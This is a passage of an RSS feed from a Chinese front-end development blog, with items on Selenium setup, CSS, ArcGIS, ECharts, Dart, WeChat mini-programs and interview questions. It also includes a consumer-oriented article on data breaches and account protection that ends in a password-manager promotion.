&#39;&#39;.</description>
    </item>
    <item>
      <title>[ WARN ] Keyword ‘Capture Page Screenshot’ could not be run on failure: No brows遇到的第一个问题open browser</title>
      <link>https://anwangtanmi.github.io/posts/04a89feb5fad4c9fa3d0961ae14424a6/</link>
      <pubDate>Sun, 25 Nov 2018 15:18:11 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/04a89feb5fad4c9fa3d0961ae14424a6/</guid>
      <description>在新手初期，当你写一个简单的程序的时候可能会显示你的open browser的错误。如下：&#xA;错误信息：[ WARN ] Keyword ‘Capture Page Screenshot’ could not be run on failure: No browser is open&#xA;默认情况下，selenium的默认浏览器是firefox,所以当你使用chrome或者ie的时候可能显示这个错误，这时候按照以下操作就行处理&#xA;1.看一下当前浏览器版本（chrome为例子，chrome不要太新）&#xA;电击导航栏最右侧–〉自定义及控制–〉帮助–〉关于chrome就可以看出他的版本号&#xA;2.找出对应当前chrome版本的chromedriver的版本号&#xA;然后去这个链接上下载当前的chromedriver.exe&#xA;http://chromedriver.storage.googleapis.com/index.html&#xA;3.把下载下来的chromedriver放在python27/script这个文件夹下面&#xA;4.点击chrome属性，看一下他的起始位置然后复制粘贴后&#xA;5.点击计算机右击属性–〉高级属性–〉环境变量–〉在path里面添加chrome的路径&#xA;chromedriver版本 支持的Chrome版本 v2.43 v69-71 v2.42 v68-70 v2.41 v67-69 v2.40 v66-68 v2.39 v66-68 v2.38 v65-67 v2.37 v64-66 v2.36 v63-65 v2.35 v62-64 v2.34 v61-63 v2.33 v60-62 v2.32 v59-61 v2.31 v58-60 v2.30 v58-60 v2.29 v56-58 v2.28 v55-57 v2.27 v54-56 v2.26 v53-55 v2.25 v53-55 v2.24 v52-54 v2.</description>
    </item>
    <item>
      <title>css3 颜色过渡以及阴影</title>
      <link>https://anwangtanmi.github.io/posts/9ca1b0e0ffe190bfcf5b57e713d04da4/</link>
      <pubDate>Tue, 13 Nov 2018 16:37:12 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/9ca1b0e0ffe190bfcf5b57e713d04da4/</guid>
      <description>背景颜色过渡:&#xA;background: linear-gradient(to bottom, #000000 0%,#ffffff 100%); 阴影：&#xA;box-shadow：color h-shadow v-shadow blur spread inset； color：阴影颜色 ------------ 可选 h-shadow ：水平偏移量 ----必选 v-shadow：垂直偏移量-----必选 blur：模糊距离 -------------可选 spread：阴影尺寸---------- 可选 inset：内阴影 --------------可选 box-shadow: darkgrey 10px 10px 30px 5px ;//边框阴影&#xA;box-shadow: darkgrey 0px 0px 30px 5px inset;//边框内阴影&#xA;h-shadow（水平）：指定水平偏移阴影。正值（即：5px）阴影向右，而为负值（即：- 10px）将使它偏向左。&#xA;v-shadow（垂直）：指定垂直偏移阴影。正值（即：5px）会使阴影在框的底部，而负值（即：- 10px）将使它偏向上。&#xA;blur(模糊)：设置的柔化半径。默认值为0，这意味着没有模糊。正值增加了模糊，而负值，实际上缩小了阴影。此属性默认为0。&#xA;color(颜色)：颜色值,也就是设置阴影颜色。</description>
    </item>
    <item>
      <title>Jest  安装测试</title>
      <link>https://anwangtanmi.github.io/posts/62b5e8b26ae0988cb6adf9bad54696cb/</link>
      <pubDate>Tue, 06 Nov 2018 13:18:21 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/62b5e8b26ae0988cb6adf9bad54696cb/</guid>
      <description> </description>
    </item>
    <item>
      <title>ArcGIS API for JavaScript 4.9学习笔记一（创建2D/3D地图）</title>
      <link>https://anwangtanmi.github.io/posts/3969dc2f82c5ef9bd7bf431aeafe7a9a/</link>
      <pubDate>Fri, 02 Nov 2018 19:06:38 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/3969dc2f82c5ef9bd7bf431aeafe7a9a/</guid>
      <description>ArcGIS API for JavaScript 4.9学习笔记一（创建2D/3D地图） 2D： 代码：&#xA;&amp;lt;/span&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&#34;utf-8&#34;&amp;gt; &amp;lt;meta name=&#34;viewport&#34; content=&#34;initial-scale=1, maximum-scale=1, user-scalable=no&#34;&amp;gt; &amp;lt;title&amp;gt;Intro to MapView - Create a 2D maptitle&amp;gt; &amp;lt;style&amp;gt; html, body, #viewDiv { padding: 0; margin: 0; height: 100%; width: 100%; } style&amp;gt; &amp;lt;link rel=&#34;stylesheet&#34; href=&#34;https://js.arcgis.com/4.9/esri/css/main.css&#34;&amp;gt; &amp;lt;script src=&#34;https://js.arcgis.com/4.9/&#34;&amp;gt;script&amp;gt; &amp;lt;script&amp;gt; require([ &#34;esri/Map&#34;, &#34;esri/views/MapView&#34; ], function(Map, MapView){ var map = new Map({ basemap: &#34;streets&#34; }); var view = new MapView({ container: &#34;viewDiv&#34;, // Reference to the scene div created in step 5 map: map, // Reference to the map object created before the scene zoom: 4, // Sets zoom level based on level of detail (LOD) center: [15, 65] // Sets center point of view using longitude,latitude }); }); script&amp;gt; head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div id=&#34;</description>
    </item>
    <item>
      <title>Echarts学习笔记1——echarts柱状图分析</title>
      <link>https://anwangtanmi.github.io/posts/cae439a210c060df3131e825f13f1ca1/</link>
      <pubDate>Fri, 19 Oct 2018 10:56:41 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/cae439a210c060df3131e825f13f1ca1/</guid>
      <description>做数据可视化时，Echarts是很好用的。这里来一个学习笔记系列。&#xA;官网：http://echarts.baidu.com/&#xA;一、引用echarts Echarts可以用npm进行安装，也可以直接导入到web项目进行引用，博主采用了引用方式直接分析它的使用。&#xA;下载Echarts：http://echarts.baidu.com/download.html&#xA;导入相关js：&#xA;body里的内容如下：&#xA;结果图：&#xA;二、echarts柱状图分析 1，init渲染 首先echarts通过js找到id为main的div，通过init(document.getElementById(‘main’))对该框进行渲染。到这一步是没有任何显示的。&#xA;真正起作用的事setOption方法。&#xA;让我们来看下init 的api：&#xA;(dom: HTMLDivElement|HTMLCanvasElement, theme?: Object|string, opts?: { devicePixelRatio?: number renderer?: string width?: number|string height? number|string }) =&amp;gt; ECharts dom就是指一个dom对象，像document.getElementById(‘main’))；&#xA;theme的话可以设置主题，比如增加一个theme属性：echarts.init(document.getElementById(‘main’),’dark’)，界面变为：&#xA;对于theme而言，dark和light一般是有的，其他的主题就得找一找咯&#xA;opts和theme一样是可选的，用来显示指定实例相关属性。&#xA;2，setOption setOption是这段代码的核心，设置图表实例的配置项以及数据，万能接口，所有参数和数据的修改都可以通过setOption完成。ECharts 会合并新的参数和数据，然后刷新图表。如果开启动画的话，ECharts 找到两组数据之间的差异然后通过合适的动画去表现数据的变化。&#xA;调用setOption方法：&#xA;chart.setOption(option, { notMerge: ..., lazyUpdate: ..., silent: ... }); option:图表的配置项和数据；notMerge：可选，是否不跟之前设置的option进行合并，默认为false，即合并。；lazyUpdate：可选，在设置完option后是否不立即更新图表，默认为false，即立即更新。silent：可选，阻止调用 setOption 时抛出事件，默认为false，即抛出事件。&#xA;像代码中的xAxis: {type: ‘category’}, 这些部分，都属于opts的部分，还有dataset也属于option的内容。&#xA;配置项API：http://echarts.baidu.com/option.html#xAxis&#xA;（1）title 以title为例，如果在option选项中加入 ：&#xA;title:{text:[&#xA;‘bars1′,’bars2′,’bars3’&#xA;]},&#xA;则会在页面上显示标题：&#xA;（2）xAxis 这个属性是用来设置x轴的&#xA;重点看一下type这个属性：&#xA;&#39;value&#39; 数值轴，适用于连续数据。</description>
    </item>
    <item>
      <title>收藏网址大全</title>
      <link>https://anwangtanmi.github.io/posts/f67eb106a4cd576fba211a9526406e0b/</link>
      <pubDate>Tue, 09 Oct 2018 17:46:48 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/f67eb106a4cd576fba211a9526406e0b/</guid>
      <description> 1.免费接口大全： https://github.com/jokermonn/-Api 2.svg在线编辑器： http://www.zuohaotu.com/svg/ 3.脚本之家在线工具 http://tools.jb51.net/color 4.对你写的正则执行步数查询 https://regex101.com/ 5.mpvue-docs http://mpvue.com/mpvue/ 6.图片处理 https://developer.qiniu.com/dora/manual/1270/the-advanced-treatment-of-images-imagemogr2 7.起名网站 https://unbug.github.io/codelf/#%E4%BD%9C%E8%80%85 8.兼容查询 https://caniuse.com 压缩图片 https://tinypng.com/ </description>
    </item>
    <item>
      <title>Dart语言学习总结</title>
      <link>https://anwangtanmi.github.io/posts/7c30e3f91ca578719a4e62477ed680b3/</link>
      <pubDate>Tue, 09 Oct 2018 09:40:18 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/7c30e3f91ca578719a4e62477ed680b3/</guid>
      <description>因要学习flutter平台，平台语言使用Dart，看了一下官方的demo:&#xA;https://github.com/flutter/flutter&#xA;看起来有点吃力，还是学习Dart语言也有利于以后开发，学习地址：&#xA;https://www.dartlang.org/guides/language/language-tour&#xA;https://www.dartlang.org/guides/libraries/library-tour&#xA;总结如下：&#xA;1.Dart简介 强类型语言&#xA;一个单线程的语言&#xA;类型注释是可选的，Dart可以推断类型。&#xA;Dart支持泛型类型&#xA;程序都必须具有顶级main()功能，该功能用作应用程序的入口点&#xA;接口可以有函数&#xA;类和接口是统一的，都是接口&#xA;2.关键字： abstract 2&#xA;dynamic 2&#xA;implements 2&#xA;show 1&#xA;as 2&#xA;else&#xA;import 2&#xA;static 2&#xA;assert&#xA;enum&#xA;in&#xA;super&#xA;async 1&#xA;export 2&#xA;interface 2&#xA;switch&#xA;await 3&#xA;external 2&#xA;is&#xA;sync 1&#xA;break&#xA;extends&#xA;library 2&#xA;this&#xA;case&#xA;factory 2&#xA;mixin 2&#xA;throw&#xA;catch&#xA;false&#xA;new&#xA;true&#xA;class&#xA;final&#xA;null&#xA;try&#xA;const&#xA;finally</description>
    </item>
    <item>
      <title>css 变量 实现页面换肤</title>
      <link>https://anwangtanmi.github.io/posts/8293f158c8e6e70903b2bfa96082d217/</link>
      <pubDate>Sat, 29 Sep 2018 10:50:33 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/8293f158c8e6e70903b2bfa96082d217/</guid>
      <description>开始之前先说说css3的自定义属性，之前我们在写css的时候全部都是使用自身属性，比如margin,padding等。但是你曾是否见过这样的css&#xA;:root{ --primary-color:#989898; --light:#fff; --dark:#000; } 其中的–primary-color、–light、–dark就是自定义的属性。&#xA;自定义属性的命名规则 --variables-name:variables-value --属性名:属性值 例如定义一个主题颜色： --theme-color:red; 作用域 //:root作用于全局 :root{ --theme-color:red; } //#app作用于id为app的节点内 #app{ --theme-color:red; } 使用方法 var(自定义属性名) 通过JS获取和设置自定义的属性 //js中获取--theme-color的值 var styles = getComputedStyle(document.documentElement); var value = styles.getPropertyValue(&#34;--theme-color&#34;); console.log(value);//red //js中更改--theme-color的值 document.documentElement.style.setProperty(&#34;--theme-color&#34;,&#34;black&#34;); 明白了这几个概念我们开始实现我们的换肤功能：&#xA;CSS3自定义属性实现换肤功能 CSS3自定义属性实现换肤功能Demo red black blue ——————— 本文来自 花开花又谢 的CSDN 博客 ，全文地址请点击：https://blog.csdn.net/u010730897/article/details/81116958?utm_source=copy&#xA;主要使用到 :root 伪类 和 — css 变量, 浏览器兼容情况要考虑&#xA;想要更详细了解的, 可以点这里张鑫旭大神的博文:&#xA;https://www.zhangxinxu.com/wordpress/2016/11/css-css3-variables-var/</description>
    </item>
    <item>
      <title>面试web前端工程师的两个星期的心路历程及面试题</title>
      <link>https://anwangtanmi.github.io/posts/0d2d9a527748e3966cca72875e094717/</link>
      <pubDate>Fri, 28 Sep 2018 19:37:00 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/0d2d9a527748e3966cca72875e094717/</guid>
      <description>毕业接近3年半了，年初公司进行了一次业务调整，hr小姐姐明里暗里让我们自动滚蛋，但是我牛脾气上来了你不说可能我自己会走，你这一说我偏不走了，于是乎，生生熬到9月份。。。&#xA;9月中旬开始改简历，投递简历。。。小姐姐我并不是大神，简简单单的一个小前端，主要做官网类型的开发，主要使用html,css3,javascript,jquery外加一点儿vue.js，后端语言稍微了解一点儿php，没办法，原来php小哥哥走了，没人做了，我就硬着头皮改着。个人感觉可以了，就挑了几个合适的公司开始投简历，过了两天开始接到面试电话，然后开始了长达一个多星期的面试。&#xA;一开始什么准备都没有，直接去面试，基本都被虐的不行，但也是自己略菜，有些基本的js问题都忘了，回来好好复习了一下之后，后面的面试基本没什么问题，但是总能碰到一些我无法描述的问题。下面我把我面试过程中遇到的问题分享给大家：&#xA;1、html三栏布局有几种(就是左右固定，中间自适应)&#xA;浮动布局float、定位布局、flex布局、表格布局、css3栅栏布局&#xA;2、html5有哪些新特性&#xA;字体样式、圆角、视频、音频、canvas、svg、sessionstorge、localstorage…&#xA;3、css3位移怎么做&#xA;transform:translate(x,y)&#xA;4、垂直居中有几种方法？&#xA;定位，表格下（text-justify），display:flex(又问具体实现的属性叫什么…突然忘了，想了好一会儿，align-item,text-justify)&#xA;5、如何提升网站性能？SEO优化？&#xA;减少http请求；图片、样式、js压缩再使用；使用cdn；样式、脚本尽量使用外链；减少dom操作；html语义化；&#xA;网站头部title,keywords,description正确描述；html语义化；&#xA;6、js里面关于数组的操作有哪些？&#xA;jion;concat;pop;push;splice;slice;&#xA;7、js数组操作pop返回值是什么？push操作返回值是什么？&#xA;pop返回删掉数组最后的那个元素;push增加元素返回长度。。。&#xA;8、http协议返回码的含义&#xA;4xx：客户端错了；5xx：服务端错了；2xx：成了&#xA;9、js深拷贝和浅拷贝的问题&#xA;个人浅理解，浅拷贝就是复制这个对象及属性值，并没有重新开一个内存出来，所以原来属性变了复制过来的也跟着一起变；深拷贝，直接复制整个对象，开辟一个新的内存；&#xA;10、关于typeof&#xA;console.log(typeof(a)) //object&#xA;console.log(typeof(‘a’)) //string&#xA;console.log(typeof(1)) //number&#xA;console.log(typeof(null)) //object&#xA;console.log(typeof(undefined)) //undefined&#xA;console.log(typeof(false)) //boolean&#xA;11、关于null、undefined&#xA;12、js变量的提升&#xA;13、js作用域&#xA;14、js原型与原型链&#xA;15、for循环 （。。错了）&#xA;16、settimeout&#xA;17、js回收垃圾&#xA;18、数组去重&#xA;19、数组查重&#xA;20、单例模式和观察者模式用代码表示出来（我一脸懵逼，这我要怎么用代码描述。。。）&#xA;21、两个数组相加（做错了）&#xA;22、js继承&#xA;构造继承、原型继承&#xA;携程面试题，可是我也不知道当时在抽什么风，构造函数居然写不出来，我估计是去搞笑的，生生浪费了这次机会&#xA;总结&#xA;以上就是我要说的内容，希望以上的内容可以帮助到正在默默艰辛的大家，希望大家在往后的工作与面试中一切顺利。&#xA;那如何学习才能快速入门并精通呢？&#xA;当真正开始学习的时候难免不知道从哪入手，导致效率低下影响继续学习的信心。&#xA;但最重要的是不知道哪些技术需要重点掌握，学习时频繁踩坑，最终浪费大量时间，所以有一套实用的视频课程用来跟着学习是非常有必要的。&#xA;本次给大家推荐一个免费的学习群，里面概括移动应用网站开发，css，html，webpack，vue node angular以及面试资源等。&#xA;对web开发技术感兴趣的同学，欢迎加入Q群：866109386，不管你是小白还是大牛我都欢迎，还有大牛整理的一套高效率学习路线和教程与您免费分享，同时每天更新视频文件资料。&#xA;最后，祝大家早日学有所成，拿到满意offer，快速升职加薪，走上人生巅峰。</description>
    </item>
    <item>
      <title>小程序在当前页面改变上一页面状态</title>
      <link>https://anwangtanmi.github.io/posts/984f0983bf72f35af69c45dcd2532f93/</link>
      <pubDate>Tue, 18 Sep 2018 17:31:15 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/984f0983bf72f35af69c45dcd2532f93/</guid>
      <description> var pages = getCurrentPages(); //获取当前页面 var prevPage = pages[pages.length - 2]; //获取上以页面 console.log(prevPage) var wishDatialItem = &#34;wishDatial[&#34; + that.data.index + &#34;].is_partake&#34;; //获取上以页面点击的index下面是直接改变 //setData直接改变状态 触发旧的状态改变 console.log(wishDatialItem) prevPage.setData({ [wishDatialItem]: false, }) </description>
    </item>
    <item>
      <title>登录注册样例（附带输入信息检验） springmvc</title>
      <link>https://anwangtanmi.github.io/posts/049db272771c59128de31345013b4e15/</link>
      <pubDate>Mon, 17 Sep 2018 10:03:09 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/049db272771c59128de31345013b4e15/</guid>
      <description>1 注册界面&#xA;&amp;lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=UTF-8&#34; pageEncoding=&#34;UTF-8&#34;%&amp;gt; &amp;lt;/span&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&#34;utf-8&#34;&amp;gt; &amp;lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=edge&#34;&amp;gt; &amp;lt;title&amp;gt;买家注册title&amp;gt; &amp;lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&amp;gt; &amp;lt;link rel=&#34;stylesheet&#34; href=&#34;${pageContext.request.contextPath}/conf1/css/font-awesome.min.css&#34;&amp;gt; &amp;lt;link rel=&#34;stylesheet&#34; href=&#34;${pageContext.request.contextPath}/conf1/css/ionicons.min.css&#34;&amp;gt; &amp;lt;link rel=&#34;stylesheet&#34; href=&#34;${pageContext.request.contextPath}/conf1/dist/css/adminlte.min.css&#34;&amp;gt; &amp;lt;link rel=&#34;stylesheet&#34; href=&#34;https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&#34; &amp;gt; head&amp;gt; &amp;lt;script type=&#34;text/javascript&#34;&amp;gt; function checkForm(){ if($.trim($(&#34;#name&#34;).val())==&#34;&#34;){ alert(&#34;请填写名字&#34;); $(&#34;#name&#34;).focus(); return false; } if($(&#34;#name&#34;).val().length&amp;gt;50){ alert(&#34;名字长度不得大于50个字符&#34;); $(&#34;#name&#34;).focus(); return false; } if($.trim($(&#34;#username&#34;).val())==&#34;&#34;){ alert(&#34;请填写用户名&#34;); $(&#34;#username&#34;).focus(); return false; } if($(&#34;#username&#34;).val().length&amp;gt;50){ alert(&#34;用户名长度不得大于50个字符&#34;); $(&#34;#username&#34;).focus(); return false; } if($.trim($(&#34;#password&#34;).val())==&#34;&#34;){ alert(&#34;请填写密码&#34;); $(&#34;#password&#34;).focus(); return false; } if($(&#34;</description>
    </item>
    <item>
      <title>面对大量的用户数据泄露事件，普通用户该如何保护个人的网络信息安全？</title>
      <link>https://anwangtanmi.github.io/posts/899d251d7aa06f127b482f29f0a30910/</link>
      <pubDate>Tue, 11 Sep 2018 21:49:52 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/899d251d7aa06f127b482f29f0a30910/</guid>
      <description>我们经常会在新闻里看到或听到关于用户数据泄露的事件，这些用户数据的泄露会对网站或服务的使用者产生非常严重的安全威胁。作为一个网络用户，您对用户数据泄露的严重程度和这些用户数据泄露事件背后的具体细节，又了解多少呢？&#xA;谈到数据泄露，就不得不介绍一下与之相关的几个常用的黑客术语。在与数据泄露事件相关的报道中，经常可以听到拖库，洗库和撞库这几个词。拖库指的是黑客入侵有价值的网站，把注册用户的资料数据库全部盗走的行为。洗库是指在取得大量的用户数据之后，黑客会通过一系列的技术手段和黑色产业链将有价值的用户数据变现。撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户信息列表。由于很多用户习惯在不同网站使用相同的帐号密码，因此黑客可以通过获取用户在A网站的账户信息去尝试登录B网址，这就可以理解为撞库攻击。&#xA;黑客获取用户数据的手段（拖库/data breaches） 黑客获取用户数据的手段主要分为社工手段和技术手段。社工手段主要是利用人的心理学特点，通过欺骗或冒充等手段获取信息，比如利用邮件、钓鱼网站等手段获取用户信息。技术手段则是指利用系统本身的漏洞直接侵入目标系统获取用户信息。在实际攻击过程中，黑客往往会混合使用这两种方法。 为了说明拖库，洗库和撞库这三者之间的关系，以下选用了启明星辰安星web 安全运维团队在总结2011大规模数据泄露研究报告中的一张图。这张图非常清楚地说明了这三个环节之间的相互关系。&#xA;那么，到底目前网络用户信息泄露问题有多严重呢？&#xA;在国内，2016年以前有一个专门曝光用户数据泄露事件的网站叫乌云网。如果留意看新闻的人应该还记得，在2016年之前经常有关于在乌云网上报出的用户数据泄露事件。乌云网曾经曝光的携程支付漏洞和12306网站用户数据泄露事件，目前在百度百科上还可以搜到。但这个由“白帽子们”发起的可以用来衡量网络安全程度的安全问题曝光网站，在2016年被强制关闭了。对于这一事件的评价有着非常极端的两面性，赞同关闭的人认为数据泄露事件曝光后，会有更多的黑客利用被曝光的漏洞进行攻击。反对的人则认为，没有这样的网站，服务提供商不会那么重视网络服务的安全，在提供更多服务的同时，会产生更多的系统漏洞，从而会给网络用户带来更多的危险。但不管怎样，乌云网被关闭的事件说明，黑客使用技术手段大量获取用户资料不是偶发事件，而几乎是网络安全的常态。&#xA;当失去乌云网后，网络用户是否真的无法知道当前的用户数据泄露问题有多严重了呢？&#xA;其实不然，在这方面比乌云网更出名的类似网站还有”Have I been Pwned?”（HIBP）。2013年底，网络安全专家Troy Hunt意识到当时的用户数据泄露已经达到了无法控制的地步，所以他决定与其让黑客独享这些数据，不如把所能获取到的数据制作成可以搜索的数据库，让普通用户也可以很容易地知道自己的资料是否已经泄露了。如果您还没有听说过这个网站，建议您可以去这个网站上检查一下自己账号的安全性。HIBP网站的网址是：https://haveibeenpwned.com。如下图HIBP网首页站所显示，到目前为止HIBP所记录的被泄露的用户数已高达50多亿。&#xA;除了可以自行去HIBP网站查找自己的用户名和密码是否被泄露以外，目前很多网络服务其实也在使用HIBP的数据来帮助用户提高账号的安全程度。比如，作者本人就曾在登陆GitHub时收到过下图所示的警告信息。&#xA;这个警告信息是说，您的账号目前已经可以在HIBP的数据库中找到了，建议更改和使用更高强度的密码。 当您去HIBP中查找后，若发现资料已被泄露，HIBP还能很贴心地告诉您，您的资料是在哪次数据泄露事件中被搜集的，您的什么资料可以在HIBP数据库中找到，如下图所示。&#xA;用户数据的利用（洗库） 前面我们谈到的是用户数据是如何被泄露的，以及目前用户数据的泄露问题有多严重。那么，当黑客获取到某个网站的用户数据后，这些数据是如何被利用的呢？基本上，被盗取的数据分成两部分：第一部分是以明文形式存储的用户信息，比如，姓名、电话号码、邮件地址等，更严重的可能还包括身份证号码、信用卡、银行账号等敏感信息。黑客可以把这些信息打包出售给不同的非法使用者。第二部分就是加密过的用户密码。为了最大程度地保护用户信息安全，大多数网站一般都是采用加密方式来存储用户密码，而不是明文存储。前面提到的HIBP网站上已泄露的用户密码就是存储的密码Hash值而不是明文。如果您想了解更多关于Hash算法的介绍，可以参考另一篇文章网络信息安全领域中常见的几个概念。黑客需要破解经Hash算法加密后的密码才能使用这一部分数据。用于破解密码Hash值的主要方法是碰撞攻击（Collision attack），维基百科上对Collision attack有非常详细的介绍。当黑客利用Collision attack将破解了的用户密码和用户名配对制成一张表格后，黑客就可以利用这张表来进行第二轮攻击了。&#xA;用户数据的再次利用（撞库） 如果不考虑社工手段，黑客使用技术手段获取的用户数据，主要是利用系统漏洞攻击那些防护措施薄弱的网站所得到的。当黑客把用户数据整理成一张可以再次使用的表格时，非常多的网站都可能被攻陷了。这主要是由于用户往往会使用同样的用户名和密码来注册不同的网络服务，这样黑客就可以利用已知的用户信息来获取其他网站同一用户的资料。这也就是为什么很多的用户数据泄露是通过撞库攻击所得到的。&#xA;如何保护自己的网络信息安全 所谓道高一尺，魔高一丈。网络上的攻防战争是永远没有结束那一天的。信息安全是服务提供方和用户本身双方的责任。做为网络用户，我们应该怎么办？其实，有很多方法是可以提高网络信息安全水平的，但讲多了，大多数人无法做到。这里只提最重要的三点供参考： 1. 不要使用同一用户名和密码来注册所有的网络服务。这无疑是最不安全的做法； 2. 提高密码的复杂程度。建议使用8位以上，数字、字母和符号的组合密码； 3. 对于重要的账号开启多重验证方法，如密码加短信，密码加OTP验证等。&#xA;以上第一、第二点，相信大家已经听过无数遍了。如果做到这两点，就会极大程度地增加黑客的工作量。要知道，黑客的时间也是很宝贵的，当您的防范措施比其他人复杂得多时，黑客可能就会选择放弃，而去尝试下一条数据了。&#xA;对于第三点多重验证，这本来是用于对安全性要求很高的网络服务所提供的安全措施，但随着用户数据泄露问题越来越严重，多重验证也逐渐被主流的网络服务所采用了。&#xA;什么是多重验证？多重验证是指，当用户在使用网络服务时，需要通过两种以上的认证机制之后才可以使用网络服务。这里讲的认证机制是指相互独立的验证手段。比如，当用户输入了用户名和密码后，系统提示还需要输入短信验证码。通常，当用户在陌生或新设备上登陆账户时，系统就会要求两种以上的认证机制。多重验证能更有效地保护用户账号安全。&#xA;多重验证根据复杂程度可以分成很多种，比如安全性最高的基于不对称加密算法的U盾，被广泛应用在银行业中。在一般的多重验证手段中，更常用的是邮件、短信、密码器、软件密码器或基于常用设备的应用推送等。这些常用的验证手段多数是基于一次性密码（OTP）的验证方法。随着国内互联网行业的飞速发展，一些具有创新性的多重验证方法也逐渐在国内流行开来。比如基于常用设备的二维码识别，这本来是微信和支付宝率先使用的验证和支付手段，目前很多国内银行的网银登陆也开始支持二维码扫描登陆了。除了二维码外，比较特别的验证方法还有，微信支持声纹验证，支付宝和百度支持面部识别等。由于多重验证方法种类繁多，无法逐一介绍，下表例举了一些常用网络服务所支持的多重验证方法供参考。&#xA;随着多重验证的使用和用户账号管理的复杂程度越来越高，国内的领先互联网服务提供商开始使用一站式的安全应用来专门用作账户管理。其中具有代表性的有QQ安全中心、百度账号管家和网易账号管家等。这些应用通常要求用户将应用与常用设备绑定，然后通过绑定后的应用来管理用户的账户设置。这样的一站式应用可以提供更多元的账户管理功能，比如账户功能的开启和关闭，被盗账号的找回等等。 现在，您一定对互联网账户的安全有了进一步的了解。是否很想去HIBP网站上查一下自己的资料有没有被泄露？如果在HIBP的数据库里能查找到您的账号，以上提及的三点就是您必须要立即采取的防范措施，否则理论上说，所有人都可能通过HIBP找到您的用户名和密码，登录您的账号了。&#xA;PassXYZ是一款跨平台的密码管理软件，可以运行在安卓和苹果手机以及Windows 10上。 PassXYZ基于著名的开源软件KeePass开发，所以兼容KeePass数据格式。PassXYZ的核心代码可以在开源社区GitHub上获取。PassXYZ最大的特点是通过提供大量的个人信息记录模板来分享和传递良好的使用习惯。PassXYZ个人信息管理软件和PassXYZ公众号的目标是通过两者的结合来推动和提高公众的个人信息管理水平。&#xA;您可以通过苹果应用商店，微软应用商店，Google Play和华为应用商店搜索关键字PassXYZ来下载该应用。如果您想获得更多模板或对个人信息安全及管理有兴趣，可以搜索关键字PassXYZ关注公众号。您也可以通过微信号passxyz_kpclib来添加此公众号。PassXYZ公众号专注于个人信息安全及管理的相关知识。</description>
    </item>
    <item>
      <title>小程序黑内幕，我陷入了沉思</title>
      <link>https://anwangtanmi.github.io/posts/1ab49bb44fac9567ab67779f9363383b/</link>
      <pubDate>Thu, 30 Aug 2018 15:56:09 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/1ab49bb44fac9567ab67779f9363383b/</guid>
      <description>小程序火起来是事实的，因为据腾讯2017年微信用户报告，日活用户达9.02亿，阿里、百度、谷歌、FaceBook等巨头分别推出了自己的小程序，说明千万别低估了小程序等轻应用！但谈到过度的颠覆、风口、替代、成本低、完爆、无需代码、圈地、一键生成等等营销字眼，我陷入了沉思。&#xA;成本低？&#xA;开发成本：&#xA;各大平台分别推出了自己的小程序开发平台，基于云端可以快速生成小程序界面，并提供了大量模板供用户付费购买。大尺度的宣传国内领先、海量小程序行业模板、一键生成、无需代码等等。&#xA;不懂技术的人，也许会简单的认为，微信小程序就是类似于我们平常接触的H5页面，WebApp或者手机端网站，只要将原有的代码改改，就可以变成微信小程序。其实这种想法是错误的，微信小程序相当于重新做了一个不同于传统形式的App，从开发、设计、测试、运维升级都是单独的一套。换句话说，以后要做小程序开发，就需要一个新的技术岗位。&#xA;一键生成必须要兼容拖拉成的H5页面，一是先转换成小程序代码后发布，二是在小程序中嵌套H5转小程序，前者必须时刻跟进小程序的API更新，而且中间转换的问题比较难兼容，后者市面上不少开源的提供，但多少会牺牲一些性能，而且也是兼容有限。&#xA;所以各大平台推出的一键生成是有一定的局限的，稍微复杂一点的小程序，必须定制外包，外表这层宣传壳只是吸引人，真正请了大量的开发在后面服务，复杂的一点的小程序几百块就变成了几万块。&#xA;冷静点，一键生成只是个很强的辅助功能，至少可以减少大量的工作量，但吹成万能就不厚道了。&#xA;营销成本：&#xA;小程序设计完成后，接下来该想想怎么招揽用户了，如果真的什么都不用管用户自己刷刷刷就进来了，那么还要运营做什么呢？零营销成本你就吹吧！&#xA;主动搜索 首先用户清晰得知道你的名字，而且知道你的小程序能干什么！&#xA;扫描二维码 扫描二维码，这是微信官方最期望开发者引导用户做的，这里主要的运营点在线下。&#xA;分享 分享传播引导、活动运营、社群运营三个运营点的考验，这也是线上运营最值得去深耕的地方。&#xA;公众号关联 这也就意味着用户可以从公众号里进入其相对应的小程序，亦可从小程序里跳转至相对应的公众号。&#xA;历史使用 